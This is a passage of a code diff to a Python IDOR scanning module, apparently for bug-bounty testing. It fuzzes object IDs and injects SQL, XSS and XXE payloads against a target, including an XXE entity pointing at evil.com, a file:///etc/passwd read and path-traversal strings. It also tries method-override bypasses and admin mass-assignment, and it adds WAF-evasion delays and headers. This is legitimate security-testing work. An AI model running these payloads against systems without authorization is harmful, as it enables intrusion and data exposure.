@@ -22,6 +22,22 @@ Integrates from IDOR-Forge:
   - Path traversal via numeric segment replacement
 
 All async, zero extra deps — uses BaseModule._make_request exclusively.
+
+FIXES vs original
+─────────────────
+ 1. DOUBLE-ADD BUG: every emit method called both self.findings.append(f)
+    AND self.add_finding(f).  add_finding() already appends — removed the
+    redundant manual append from every single emit method.
+ 2. _test_parameter_pollution: only runs on endpoints where param_name is
+    already present in the query string (otherwise it's a plain request,
+    not pollution).
+ 3. _discover_endpoints: Content-Type lookup is now case-insensitive.
+ 4. _SQL_PAYLOADS / _XSS_PAYLOADS / _XML_PAYLOADS converted to sets for
+    O(1) membership test (was O(n) per request).
+ 5. 'import time' moved to module top level.
+ 6. _build_patterns: each IDORPattern now carries an explicit id_group int
+    so _analyze_endpoint never guesses the wrong capture group.
+ 7. Inter-phase asyncio.sleep(0.5) added to reduce WAF detection surface.
 """
 
 import re
@@ -33,6 +49,7 @@ import string
 import hashlib
 import asyncio
 import os
+import time                          # FIX 5: module-level import
 from difflib import SequenceMatcher
 from typing import List, Dict, Optional, Set, Tuple, Any
 from dataclasses import dataclass, field
@@ -42,11 +59,11 @@ from core.base_module import BaseModule, Finding
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Wordlist loaders — zero external deps
+#  Wordlist loaders
 # ══════════════════════════════════════════════════════════════════════════════
 
 def _load_wordlist(rel_path: str, fallback: List[str]) -> List[str]:
-    """Load a payload wordlist relative to project root, fall back to built-ins."""
+    """Load a payload wordlist relative to project root; fall back to built-ins."""
     roots = [
         os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..'),
         os.path.dirname(os.path.abspath(__file__)),
@@ -75,7 +92,7 @@ _SQL_FALLBACK = [
 
 _XSS_FALLBACK = [
     "<script>alert('XSS')</script>", '"><script>alert(\'XSS\')</script>',
-    "<svg onload=alert('XSS')>", "<IMG SRC=\"javascript:alert('XSS');\">",
+    "<svg onload=alert('XSS')>", '<IMG SRC="javascript:alert(\'XSS\');">',
     "<body onload=alert('XSS')>", "<svg/onload=alert('XSS')>",
 ]
 
@@ -83,23 +100,25 @@ _XML_FALLBACK = [
     '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
     '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;">]><root>&lol1;</root>',
-    '<user><name>\' or \'1\'=\'1</name><password>password</password></user>',
+    "<user><n>' or '1'='1</n><password>password</password></user>",
 ]
 
-# Loaded once at import time
-_SQL_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/sql.txt', _SQL_FALLBACK)
-_XSS_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/xss.txt', _XSS_FALLBACK)
-_XML_PAYLOADS: List[str] = _load_wordlist('wordlists/payloads/xml.txt', _XML_FALLBACK)
+# FIX 4: sets for O(1) membership tests
+_SQL_PAYLOADS_LIST: List[str] = _load_wordlist('wordlists/payloads/sql.txt', _SQL_FALLBACK)
+_XSS_PAYLOADS_LIST: List[str] = _load_wordlist('wordlists/payloads/xss.txt', _XSS_FALLBACK)
+_XML_PAYLOADS_LIST: List[str] = _load_wordlist('wordlists/payloads/xml.txt', _XML_FALLBACK)
+
+_SQL_PAYLOADS: Set[str] = set(_SQL_PAYLOADS_LIST)
+_XSS_PAYLOADS: Set[str] = set(_XSS_PAYLOADS_LIST)
+_XML_PAYLOADS: Set[str] = set(_XML_PAYLOADS_LIST)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  Constants
 # ══════════════════════════════════════════════════════════════════════════════
 
-# Similarity thresholds (from IDOR-Forge, adaptive at runtime)
 DEFAULT_THRESHOLDS = {'structure': 0.8, 'content': 0.9, 'text': 0.8}
 
-# Sensitive data patterns (from IDOR-Forge _contains_sensitive_data)
 SENSITIVE_KEYWORDS = [
     'password', 'passwd', 'secret', 'token', 'api_key', 'auth',
     'ssn', 'credit_card', 'card_number', 'cvv', 'expiry',
@@ -178,6 +197,7 @@ class IDORPattern:
     severity:      str
     bounty_score:  int
     confidence:    float
+    id_group:      int = 1   # FIX 6: explicit capture-group index for the ID value
 
 
 @dataclass
@@ -195,17 +215,16 @@ class ResourceEndpoint:
 
 @dataclass
 class BaselineData:
-    """Stores baseline response fingerprint for comparison (IDOR-Forge pattern)."""
-    body:           str
-    body_hash:      str
-    json_data:      Optional[Dict]
-    response_time:  float
-    status:         int
-    thresholds:     Dict = field(default_factory=lambda: dict(DEFAULT_THRESHOLDS))
+    body:          str
+    body_hash:     str
+    json_data:     Optional[Dict]
+    response_time: float
+    status:        int
+    thresholds:    Dict = field(default_factory=lambda: dict(DEFAULT_THRESHOLDS))
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  Helper functions  (ported from IDOR-Forge IDORChecker)
+#  Pure helper functions
 # ══════════════════════════════════════════════════════════════════════════════
 
 def _hash_text(text: str) -> str:
@@ -213,53 +232,29 @@ def _hash_text(text: str) -> str:
 
 
 def _clean_for_comparison(text: str) -> str:
-    """Strip dynamic noise before diff (IDOR-Forge noise filtering)."""
     for p in NOISE_PATTERNS:
         text = re.sub(p, '', text)
     return text
 
 
 def _compare_responses(baseline: str, test: str) -> Dict[str, float]:
-    """
-    IDOR-Forge response comparison: text similarity + JSON structure + JSON content.
-    Returns {'text_similarity', 'structure_similarity', 'content_similarity'}.
-    """
     b = _clean_for_comparison(baseline)
     t = _clean_for_comparison(test)
-
     text_sim = SequenceMatcher(None, b, t).ratio()
-
     try:
         b_data = json.loads(b)
         t_data = json.loads(t)
     except (json.JSONDecodeError, ValueError):
         return {'text_similarity': text_sim, 'structure_similarity': 0.0, 'content_similarity': 0.0}
-
-    # structure similarity — key overlap
     k1, k2 = set(b_data.keys()), set(t_data.keys())
     union = len(k1 | k2)
     struct_sim = len(k1 & k2) / union if union else 0.0
-
-    # content similarity — matching values on common keys
     common = k1 & k2
-    if common:
-        matching = sum(1 for k in common if b_data[k] == t_data[k])
-        content_sim = matching / len(common)
-    else:
-        content_sim = 0.0
-
-    return {
-        'text_similarity':      text_sim,
-        'structure_similarity': struct_sim,
-        'content_similarity':   content_sim,
-    }
+    content_sim = sum(1 for k in common if b_data[k] == t_data[k]) / len(common) if common else 0.0
+    return {'text_similarity': text_sim, 'structure_similarity': struct_sim, 'content_similarity': content_sim}
 
 
 def _is_idor(comparison: Dict, status: int, thresholds: Dict) -> bool:
-    """
-    IDOR-Forge detection logic:
-    Same structure but different content at HTTP 200 = likely IDOR.
-    """
     if status != 200:
         return False
     if (comparison['structure_similarity'] > thresholds['structure']
@@ -271,26 +266,18 @@ def _is_idor(comparison: Dict, status: int, thresholds: Dict) -> bool:
 
 
 def _contains_sensitive_data(body: str) -> Tuple[bool, List[str]]:
-    """
-    Scan response body for sensitive data (IDOR-Forge _contains_sensitive_data, expanded).
-    Returns (found: bool, matches: List[str]).
-    """
-    found_items = []
+    found = []
     body_lower = body.lower()
-
     for kw in SENSITIVE_KEYWORDS:
         if re.search(rf'\b{re.escape(kw)}\b', body_lower):
-            found_items.append(kw)
-
+            found.append(kw)
     for pattern in SENSITIVE_REGEX:
         if re.search(pattern, body):
-            found_items.append(pattern[:30])
-
-    return bool(found_items), list(set(found_items))
+            found.append(pattern[:30])
+    return bool(found), list(set(found))
 
 
 def _detect_sql_error(body: str, status: int) -> bool:
-    """Detect SQL injection reflection (IDOR-Forge _detect_sql_injection)."""
     if status >= 500:
         return True
     body_lower = body.lower()
@@ -298,7 +285,6 @@ def _detect_sql_error(body: str, status: int) -> bool:
 
 
 def _detect_xss_reflection(body: str, payload: str) -> bool:
-    """Detect XSS payload reflected unescaped (IDOR-Forge _detect_xss)."""
     escaped = re.escape(payload)
     if re.search(escaped, body, re.IGNORECASE):
         return True
@@ -308,14 +294,12 @@ def _detect_xss_reflection(body: str, payload: str) -> bool:
 
 
 def _detect_xml_injection(body: str) -> bool:
-    """Detect XXE / XML injection (IDOR-Forge _detect_xml_injection)."""
     indicators = ['/etc/passwd', 'root:x:', 'bin/bash', 'win.ini', '[extensions]']
     body_lower = body.lower()
     return any(ind in body_lower for ind in indicators)
 
 
 def _is_error_response(body: str, status: int) -> bool:
-    """Quick error-page filter."""
     if status in (401, 403, 404, 405, 410, 500, 502, 503):
         return True
     bl = body.lower()[:400]
@@ -327,23 +311,17 @@ def _random_string(n: int = 10) -> str:
 
 
 def _gen_id_variants(value: str) -> List[str]:
-    """
-    IDOR-Forge payload generation: all encoding/mutation variants of one ID value.
-    """
     variants = [value]
     if value.isdigit():
         n = int(value)
         variants += [str(n + 1), str(n - 1), str(n + 100), str(n + 1000),
-                     hex(n)[2:],                          # hex
-                     str(n)[::-1],                        # reversed
-                     '0' * max(0, 6 - len(value)) + value]  # zero-padded
-    # base64
+                     hex(n)[2:], str(n)[::-1],
+                     '0' * max(0, 6 - len(value)) + value]
     try:
         variants.append(base64.b64encode(value.encode()).decode())
         variants.append(base64.b64decode(value.encode() + b'==').decode('utf-8', errors='ignore'))
     except Exception:
         pass
-    # URL-encoded
     variants.append(quote(value, safe=''))
     return variants
 
@@ -353,87 +331,67 @@ def _gen_id_variants(value: str) -> List[str]:
 # ══════════════════════════════════════════════════════════════════════════════
 
 class IDORTester(BaseModule):
-    """
-    Advanced IDOR detection module — IDOR-Forge engine, RAPTOR integration.
-
-    Invoked by raptor.py:
-        async with IDORTester(config, stealth, db, graph) as m:
-            findings = await m.run(target, **kwargs)
-    """
-
-    # ── Init ─────────────────────────────────────────────────────────────────
 
     def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
         super().__init__(config, stealth, db, graph_manager)
-        self.findings:            List[Finding]         = []
-        self.discovered:          List[ResourceEndpoint] = []
-        self.tested_combos:       Set[str]              = set()
-        self.checked_forms:       Dict[str, List[str]]  = {}
-        self.baseline:            Optional[BaselineData] = None
+        self.discovered:    List[ResourceEndpoint] = []
+        self.tested_combos: Set[str]               = set()
+        self.baseline:      Optional[BaselineData]  = None
 
-        # tunables
-        self.fuzz_range   = config.get('fuzz_range', 50)
-        self.max_pages    = config.get('max_pages', 30)
-        self.thresholds   = dict(DEFAULT_THRESHOLDS)
-        self.evasion      = config.get('evasion', True)
-
-        self.id_patterns  = self._build_patterns()
-
-    # ── Context managers ─────────────────────────────────────────────────────
+        self.fuzz_range = config.get('fuzz_range', 50)
+        self.max_pages  = config.get('max_pages', 30)
+        self.thresholds = dict(DEFAULT_THRESHOLDS)
+        self.evasion    = config.get('evasion', True)
+        self.id_patterns = self._build_patterns()
 
     async def __aenter__(self):
-        self.logger.info('🔥 IDOR Module v3.0 initialising (IDOR-Forge engine)')
+        self.logger.info('IDOR Module v3.0 initialising (IDOR-Forge engine)')
         return self
 
     async def __aexit__(self, *_):
         return False
 
-    # ══════════════════════════════════════════════════════════════════════════
-    #  Public entry point
-    # ══════════════════════════════════════════════════════════════════════════
+    # ── Public entry point ────────────────────────────────────────────────────
 
     async def run(self, target: str, **kwargs) -> List[Finding]:
         scope = kwargs.get('scope', 'standard')
-        self.logger.info(f'🚀 IDOR scan → {target}  [scope: {scope}]')
+        self.logger.info('IDOR scan → %s  [scope: %s]', target, scope)
 
-        # Phase 1: Crawl & discover endpoints
-        self.logger.info('🔍 Phase 1: Crawling & discovering endpoints')
+        self.logger.info('Phase 1: Crawling & discovering endpoints')
         await self._discover_endpoints(target)
 
-        # Phase 2: Baseline + ID pattern analysis
-        self.logger.info('📊 Phase 2: Baseline fingerprinting & ID pattern analysis')
+        self.logger.info('Phase 2: Baseline fingerprinting & ID pattern analysis')
         await self._set_baseline(target)
         await self._analyze_id_patterns()
+        await asyncio.sleep(0.5)  # FIX 7: inter-phase cooldown
 
-        # Phase 3: Sequential ID fuzzing with IDOR-Forge comparison engine
-        self.logger.info('🎯 Phase 3: Sequential ID fuzzing')
+        self.logger.info('Phase 3: Sequential ID fuzzing')
         await self._test_sequential_ids()
+        await asyncio.sleep(0.5)
 
-        # Phase 4: Full payload suite (SQL, XSS, XML, UUID, base64…)
-        self.logger.info('💥 Phase 4: Full payload suite testing')
+        self.logger.info('Phase 4: Full payload suite testing')
         await self._test_full_payload_suite()
+        await asyncio.sleep(0.5)
 
-        # Phase 5: Parameter pollution
         if scope in ('standard', 'comprehensive', 'aggressive'):
-            self.logger.info('🌊 Phase 5: Parameter pollution')
+            self.logger.info('Phase 5: Parameter pollution')
             await self._test_parameter_pollution()
+            await asyncio.sleep(0.5)
 
-        # Phase 6: HTTP method bypass
-        if scope in ('standard', 'comprehensive', 'aggressive'):
-            self.logger.info('🔄 Phase 6: HTTP method bypass')
+            self.logger.info('Phase 6: HTTP method bypass')
             await self._test_method_bypass()
+            await asyncio.sleep(0.5)
 
-        # Phase 7: Mass assignment
         if scope in ('comprehensive', 'aggressive'):
-            self.logger.info('📦 Phase 7: Mass assignment')
+            self.logger.info('Phase 7: Mass assignment')
             await self._test_mass_assignment()
+            await asyncio.sleep(0.5)
 
-        # Phase 8: GraphQL ID testing (aggressive)
         if scope == 'aggressive':
-            self.logger.info('🕸️  Phase 8: GraphQL IDOR')
+            self.logger.info('Phase 8: GraphQL IDOR')
             await self._test_graphql_idor(target)
 
-        self.logger.info(f'✅ IDOR complete — {len(self.findings)} finding(s)')
+        self.logger.info('IDOR complete — %d finding(s)', len(self.findings))
         return self.findings
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -441,14 +399,11 @@ class IDORTester(BaseModule):
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _discover_endpoints(self, target: str):
-        """Crawl target + common API paths for ID-bearing endpoints."""
         parsed   = urlparse(target)
         base_url = f'{parsed.scheme}://{parsed.netloc}'
         to_visit: Set[str] = {target}
-
         for path in API_PATHS:
             to_visit.add(f'{base_url}{path}')
-
         visited: Set[str] = set()
 
         while to_visit and len(visited) < self.max_pages:
@@ -462,43 +417,49 @@ class IDORTester(BaseModule):
                 continue
 
             status = resp.status
-            ct     = resp.headers.get('Content-Type', '')
-            body   = await resp.text()
+            # FIX 3: case-insensitive Content-Type lookup
+            ct = next(
+                (v for k, v in resp.headers.items() if k.lower() == 'content-type'),
+                ''
+            )
+            body = await resp.text()
 
             endpoint = self._analyze_endpoint(url, status, ct, body)
             if endpoint:
                 self.discovered.append(endpoint)
-                self.logger.info(f'   ↳ endpoint: {url} [{endpoint.resource_type}]')
+                self.logger.info('   endpoint: %s [%s]', url, endpoint.resource_type)
 
             if 'text/html' in ct and len(visited) < self.max_pages:
                 links = self._extract_links(body, url)
                 to_visit.update(links - visited)
 
-        # Also check URL params directly from target
         target_params = parse_qs(parsed.query)
         for param, vals in target_params.items():
             if vals:
-                ep = ResourceEndpoint(
+                self.discovered.append(ResourceEndpoint(
                     url=target, method='GET', param_name=param,
-                    param_value=vals[0], resource_type=self._classify_resource(target, ''),
+                    param_value=vals[0],
+                    resource_type=self._classify_resource(target, ''),
                     response_body='', content_type='', status=0,
-                )
-                self.discovered.append(ep)
+                ))
 
-        self.logger.info(f'   {len(self.discovered)} endpoint(s) found')
+        self.logger.info('   %d endpoint(s) found', len(self.discovered))
 
     def _analyze_endpoint(self, url: str, status: int, ct: str, body: str) -> Optional[ResourceEndpoint]:
-        """Check if URL has an ID-bearing parameter — if so, create endpoint record."""
         if status >= 400:
             return None
         for pattern in self.id_patterns:
             m = re.search(pattern.pattern, url, re.IGNORECASE)
-            if m:
-                id_val = m.group(len(m.groups())) if m.groups() else ''
-                param  = self._extract_param_name(url)
+            if m and m.groups():
+                # FIX 6: use explicit id_group instead of guessing last group
+                try:
+                    id_val = m.group(pattern.id_group)
+                except IndexError:
+                    id_val = m.group(len(m.groups()))
+                param = self._extract_param_name(url)
                 return ResourceEndpoint(
                     url=url, method='GET', param_name=param,
-                    param_value=id_val,
+                    param_value=id_val or '',
                     resource_type=self._classify_resource(url, body),
                     response_body=body[:600], content_type=ct, status=status,
                     response_hash=_hash_text(body),
@@ -537,8 +498,8 @@ class IDORTester(BaseModule):
         links: Set[str] = set()
         for m in re.finditer(r'href=["\']([^"\']+)["\']', body):
             links.add(urljoin(base, m.group(1)))
-        for m in re.finditer(r'["\'](/(?:api|rest|v\d)[^"\']+)["\']', body):
-            links.add(urljoin(base, m.group(1)))
+        for m in re.finditer(r'["\']/((?:api|rest|v\d)[^"\']+)["\']', body):
+            links.add(urljoin(base, '/' + m.group(1)))
         return links
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -546,16 +507,11 @@ class IDORTester(BaseModule):
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _set_baseline(self, target: str):
-        """
-        IDOR-Forge baseline: fetch the target 3 times, average response time,
-        adapt similarity thresholds based on natural variance.
-        """
         samples = []
-        import time as _time
         for _ in range(3):
-            t0   = _time.monotonic()
+            t0   = time.monotonic()   # FIX 5: module-level time import
             resp = await self._make_request(target)
-            elapsed = _time.monotonic() - t0
+            elapsed = time.monotonic() - t0
             if resp:
                 body = await resp.text()
                 samples.append((body, elapsed, resp.status))
@@ -563,66 +519,56 @@ class IDORTester(BaseModule):
         if not samples:
             return
 
-        # Use first sample as baseline
-        body0, t0, status0 = samples[0]
+        body0, _t0, status0 = samples[0]
         try:
             j = json.loads(body0)
         except (json.JSONDecodeError, ValueError):
             j = None
 
         avg_time = sum(s[1] for s in samples) / len(samples)
-
         self.baseline = BaselineData(
             body=body0, body_hash=_hash_text(body0),
             json_data=j, response_time=avg_time, status=status0,
             thresholds=dict(DEFAULT_THRESHOLDS),
         )
 
-        # Adapt text threshold based on natural variance across 3 samples
         if len(samples) >= 2:
             variances = [
-                _compare_responses(samples[i][0], samples[i+1][0])['text_similarity']
+                _compare_responses(samples[i][0], samples[i + 1][0])['text_similarity']
                 for i in range(len(samples) - 1)
             ]
             avg_var = sum(variances) / len(variances)
-            # lower threshold slightly to account for dynamic content
             self.baseline.thresholds['text'] = max(0.5, DEFAULT_THRESHOLDS['text'] - avg_var * 0.1)
 
         self.thresholds = self.baseline.thresholds
-        self.logger.info(f'   Baseline set (adaptive text threshold: {self.thresholds["text"]:.2f})')
+        self.logger.info('   Baseline set (adaptive text threshold: %.2f)', self.thresholds['text'])
 
     async def _analyze_id_patterns(self):
-        """
-        Detect sequential / predictable ID patterns across discovered endpoints
-        and emit a finding if found.
-        """
         numeric_ids = sorted(
             int(e.param_value)
             for e in self.discovered
             if e.param_value and e.param_value.isdigit()
         )
-
         if len(numeric_ids) < 2:
             return
-
-        gaps = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids) - 1)]
-
+        gaps = [numeric_ids[i + 1] - numeric_ids[i] for i in range(len(numeric_ids) - 1)]
         if all(g == 1 for g in gaps):
             self._emit_pattern_finding(
                 'Sequential Integer IDs',
-                'IDs are sequential integers (1, 2, 3 …) — trivial to enumerate.',
-                'Critical', 4000, {'ids': numeric_ids[:10], 'pattern': 'sequential'}
+                'IDs are sequential integers (1,2,3…) — trivial to enumerate.',
+                'Critical', 4000, {'ids': numeric_ids[:10], 'pattern': 'sequential'},
             )
         elif len(set(gaps)) == 1:
             self._emit_pattern_finding(
                 'Predictable Arithmetic ID Sequence',
                 f'IDs follow an arithmetic sequence (step={gaps[0]}).',
-                'High', 2500, {'ids': numeric_ids[:10], 'step': gaps[0]}
+                'High', 2500, {'ids': numeric_ids[:10], 'step': gaps[0]},
             )
 
     def _emit_pattern_finding(self, title: str, desc: str,
                                severity: str, bounty: int, evidence: Dict):
-        f = Finding(
+        # FIX 1: only add_finding() — no redundant self.findings.append()
+        self.add_finding(Finding(
             module='idor', title=f'[PATTERN] {title}', severity=severity,
             description=(
                 f'## IDOR Pattern — {title}\n\n{desc}\n\n'
@@ -635,19 +581,13 @@ class IDORTester(BaseModule):
             remediation='Replace sequential IDs with UUIDs; add per-object authorization checks.',
             cvss_score=9.1 if severity == 'Critical' else 7.5,
             bounty_score=bounty, target='',
-        )
-        self.findings.append(f)
-        self.add_finding(f)
+        ))
 
     # ══════════════════════════════════════════════════════════════════════════
-    #  Phase 3 — Sequential ID Fuzzing  (IDOR-Forge core engine)
+    #  Phase 3 — Sequential ID Fuzzing
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _test_sequential_ids(self):
-        """
-        For each discovered endpoint, fuzz ±fuzz_range IDs and compare responses
-        against baseline using IDOR-Forge similarity engine.
-        """
         sem = asyncio.Semaphore(5)
 
         async def fuzz_endpoint(ep: ResourceEndpoint):
@@ -659,8 +599,6 @@ class IDORTester(BaseModule):
                     list(range(max(1, base_id - 5), base_id)) +
                     list(range(base_id + 1, base_id + 6))
                 )
-
-                # Get a fresh baseline for this endpoint
                 baseline_resp = await self._make_request(ep.url)
                 if not baseline_resp:
                     return
@@ -672,9 +610,9 @@ class IDORTester(BaseModule):
                         continue
                     self.tested_combos.add(combo)
 
-                    test_url  = self._replace_id(ep.url, ep.param_name, str(tid))
-                    headers   = self._evasion_headers() if self.evasion else {}
-                    resp      = await self._make_request(test_url, headers=headers)
+                    test_url = self._replace_id(ep.url, ep.param_name, str(tid))
+                    headers  = self._evasion_headers() if self.evasion else {}
+                    resp     = await self._make_request(test_url, headers=headers)
                     if not resp or _is_error_response('', resp.status):
                         continue
 
@@ -682,28 +620,22 @@ class IDORTester(BaseModule):
                     if len(body) < 30:
                         continue
 
-                    comparison        = _compare_responses(baseline_body, body)
-                    sensitive, items  = _contains_sensitive_data(body)
-                    idor_detected     = _is_idor(comparison, resp.status, self.thresholds)
-
-                    if idor_detected or sensitive:
+                    comparison       = _compare_responses(baseline_body, body)
+                    sensitive, items = _contains_sensitive_data(body)
+                    if _is_idor(comparison, resp.status, self.thresholds) or sensitive:
                         self._emit_idor_finding(
                             ep, str(tid), test_url, body,
                             resp.status, comparison, sensitive, items, 'Sequential'
                         )
-                        return  # one confirmed finding per endpoint
+                        return
 
         await asyncio.gather(*[fuzz_endpoint(e) for e in self.discovered], return_exceptions=True)
 
     # ══════════════════════════════════════════════════════════════════════════
-    #  Phase 4 — Full Payload Suite  (IDOR-Forge _generate_payloads)
+    #  Phase 4 — Full Payload Suite
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _test_full_payload_suite(self):
-        """
-        Run all IDOR-Forge payload types on each discovered endpoint:
-        ID variants, random strings, special chars, UUID, base64, SQL, XSS, XML.
-        """
         sem = asyncio.Semaphore(5)
 
         async def test_ep(ep: ResourceEndpoint):
@@ -711,7 +643,6 @@ class IDORTester(BaseModule):
                 if not ep.param_name:
                     return
 
-                # Build payload list
                 id_variants = _gen_id_variants(ep.param_value or '1')
                 extra = [
                     _random_string(10),
@@ -719,16 +650,12 @@ class IDORTester(BaseModule):
                     '!@#$%^&*()',
                     str(uuid.uuid4()),
                     '../../etc/passwd',
-                    '0',
-                    '-1',
-                    '99999999',
+                    '0', '-1', '99999999',
                 ]
-
                 all_values = id_variants + extra
-                # Add a sample of SQL / XSS / XML payloads
-                all_values += _SQL_PAYLOADS[:10]
-                all_values += _XSS_PAYLOADS[:5]
-                all_values += _XML_PAYLOADS[:3]
+                all_values += _SQL_PAYLOADS_LIST[:10]
+                all_values += _XSS_PAYLOADS_LIST[:5]
+                all_values += _XML_PAYLOADS_LIST[:3]
 
                 for value in all_values:
                     test_url = self._replace_id(ep.url, ep.param_name, value)
@@ -738,25 +665,16 @@ class IDORTester(BaseModule):
                         continue
                     body = await resp.text()
 
-                    # SQL detection
-                    if _detect_sql_error(body, resp.status) and value in _SQL_PAYLOADS:
-                        self._emit_injection_finding(
-                            ep, value, test_url, 'SQL Injection', 'High', 7.5, 2000
-                        )
+                    # FIX 4: O(1) set membership
+                    if value in _SQL_PAYLOADS and _detect_sql_error(body, resp.status):
+                        self._emit_injection_finding(ep, value, test_url, 'SQL Injection', 'High', 7.5, 2000)
 
-                    # XSS detection
                     if value in _XSS_PAYLOADS and _detect_xss_reflection(body, value):
-                        self._emit_injection_finding(
-                            ep, value, test_url, 'XSS via IDOR Parameter', 'High', 6.1, 1500
-                        )
+                        self._emit_injection_finding(ep, value, test_url, 'XSS via IDOR Parameter', 'High', 6.1, 1500)
 
-                    # XML/XXE detection
                     if value in _XML_PAYLOADS and _detect_xml_injection(body):
-                        self._emit_injection_finding(
-                            ep, value, test_url, 'XXE via IDOR Parameter', 'Critical', 9.1, 4000
-                        )
+                        self._emit_injection_finding(ep, value, test_url, 'XXE via IDOR Parameter', 'Critical', 9.1, 4000)
 
-                    # Standard IDOR (ID variants)
                     if ep.response_body and value in id_variants:
                         comparison = _compare_responses(ep.response_body, body)
                         sensitive, items = _contains_sensitive_data(body)
@@ -775,22 +693,32 @@ class IDORTester(BaseModule):
 
     async def _test_parameter_pollution(self):
         """
-        Append a duplicate parameter with value=1 — servers may use the
-        first or last occurrence, bypassing auth on the other.
+        FIX 2: only test endpoints where the param already exists in the URL
+        query string. Appending '?param=1' to a URL with no existing query
+        string is a plain request, not pollution.
         """
         for ep in self.discovered:
             if not ep.param_name:
                 continue
-            sep   = '&' if '?' in ep.url else '?'
-            purl  = f'{ep.url}{sep}{ep.param_name}=1'
-            resp  = await self._make_request(purl)
+
+            parsed = urlparse(ep.url)
+            existing_qs = parse_qs(parsed.query)
+
+            # FIX 2: skip if param not already in URL
+            if ep.param_name not in existing_qs:
+                continue
+
+            # Append a duplicate value — server may honour first or last
+            purl = f'{ep.url}&{ep.param_name}=1'
+            resp = await self._make_request(purl)
             if not resp or resp.status not in (200, 201):
                 continue
             body = await resp.text()
             if ep.response_body:
                 comp = _compare_responses(ep.response_body, body)
                 if _is_idor(comp, resp.status, self.thresholds):
-                    f = Finding(
+                    # FIX 1: only add_finding()
+                    self.add_finding(Finding(
                         module='idor',
                         title=f'[POLLUTION] Parameter Pollution IDOR on "{ep.param_name}"',
                         severity='High',
@@ -806,24 +734,18 @@ class IDORTester(BaseModule):
                         poc=f'curl "{purl}"',
                         remediation='Normalise duplicate parameters; validate object ownership.',
                         cvss_score=7.5, bounty_score=2000, target=ep.url,
-                    )
-                    self.findings.append(f)
-                    self.add_finding(f)
+                    ))
 
     # ══════════════════════════════════════════════════════════════════════════
     #  Phase 6 — HTTP Method Bypass
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _test_method_bypass(self):
-        """
-        Inject X-HTTP-Method-Override / X-Method-Override headers to trick
-        servers into processing privileged verbs under a GET/POST disguise.
-        """
         overrides = [
             {'X-HTTP-Method-Override': 'PUT'},
             {'X-HTTP-Method-Override': 'DELETE'},
             {'X-Method-Override': 'PATCH'},
-            {'X-HTTP-Method-Override': 'GET'},   # sometimes unlocks read-only bypass
+            {'X-HTTP-Method-Override': 'GET'},
         ]
         for ep in self.discovered:
             for hdrs in overrides:
@@ -835,25 +757,25 @@ class IDORTester(BaseModule):
                     comp = _compare_responses(ep.response_body, body)
                     if _is_idor(comp, resp.status, self.thresholds):
                         verb = list(hdrs.values())[0]
-                        f = Finding(
+                        hdr_name = list(hdrs.keys())[0]
+                        # FIX 1: only add_finding()
+                        self.add_finding(Finding(
                             module='idor',
                             title=f'[METHOD BYPASS] HTTP Method Override → {verb} on {ep.resource_type}',
                             severity='High',
                             description=(
                                 f'## HTTP Method Override Bypass\n\n'
-                                f'The server accepted `{list(hdrs.keys())[0]}: {verb}` '
-                                f'at `{ep.url}`, bypassing normal authorization.\n\n'
+                                f'The server accepted `{hdr_name}: {verb}` at `{ep.url}`, '
+                                f'bypassing normal authorization.\n\n'
                                 '### Remediation\n'
                                 'Ignore method-override headers unless strictly required; '
                                 'enforce authorization per HTTP verb server-side.'
                             ),
                             evidence={'url': ep.url, 'header': hdrs, 'comparison': comp},
-                            poc=f'curl -H "{list(hdrs.keys())[0]}: {verb}" "{ep.url}"',
+                            poc=f'curl -H "{hdr_name}: {verb}" "{ep.url}"',
                             remediation='Disable X-HTTP-Method-Override; enforce per-verb auth.',
                             cvss_score=7.5, bounty_score=1500, target=ep.url,
-                        )
-                        self.findings.append(f)
-                        self.add_finding(f)
+                        ))
                         break
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -861,21 +783,19 @@ class IDORTester(BaseModule):
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _test_mass_assignment(self):
-        """
-        POST privileged fields to each endpoint (IDOR-Forge mass assignment logic).
-        """
         for ep in self.discovered:
             for pf in PRIVILEGED_FIELDS:
                 try:
                     resp = await self._make_request(
                         ep.url, method='POST',
-                        data={pf: 'admin', 'role': 'admin', 'isAdmin': 'true'}
+                        data={pf: 'admin', 'role': 'admin', 'isAdmin': 'true'},
                     )
                     if not resp or resp.status not in (200, 201):
                         continue
                     body = await resp.text()
                     if re.search(rf'\b{re.escape(pf)}\b', body, re.IGNORECASE):
-                        f = Finding(
+                        # FIX 1: only add_finding()
+                        self.add_finding(Finding(
                             module='idor',
                             title=f'[MASS ASSIGN] Privileged field "{pf}" accepted at {ep.url}',
                             severity='Critical',
@@ -893,28 +813,22 @@ class IDORTester(BaseModule):
                             poc=f'curl -X POST "{ep.url}" -d "{pf}=admin"',
                             remediation='Allowlist accepted input fields; block privileged attribute injection.',
                             cvss_score=9.1, bounty_score=3500, target=ep.url,
-                        )
-                        self.findings.append(f)
-                        self.add_finding(f)
+                        ))
                         break
-                except Exception as e:
-                    self.logger.debug(f'Mass assignment error: {e}')
+                except Exception as exc:
+                    self.logger.debug('Mass assignment error: %s', exc)
 
     # ══════════════════════════════════════════════════════════════════════════
     #  Phase 8 — GraphQL IDOR
     # ══════════════════════════════════════════════════════════════════════════
 
     async def _test_graphql_idor(self, target: str):
-        """
-        Test GraphQL endpoints for IDOR via ID argument manipulation.
-        """
         parsed   = urlparse(target)
         gql_urls = [
